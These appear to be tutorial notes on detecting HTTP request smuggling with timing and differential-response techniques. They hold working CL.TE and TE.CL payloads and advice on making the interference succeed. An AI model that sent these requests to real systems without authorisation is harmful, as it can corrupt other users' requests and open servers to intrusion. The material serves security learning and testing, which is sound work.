## Timing Techniques

The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities.

### CL. TE using timing techniques

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

### TE. CL using timing techniques

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

## Differential Techiniques

This involves sending two requests to the application in quick succession:

-   An "attack" request that is designed to interfere with the processing of the next request.
-   A "normal" request.

e.g. attack request:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

e.g. normal request:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The response of the normal request would then **NOT** be 200 as it is tainted with the previous attack request.

### CL. TE using differential responses

e.g. request

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

e.g. how the back-end would treat a normal `POST` request to `/search`

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### TE. CL using differential responses

e.g. request

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

e.g. how the back-end would treat a normal `POST` request to `/search`

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

#### Note

Some important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:

-   The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
-   The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
-   When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
-   In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
-   If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.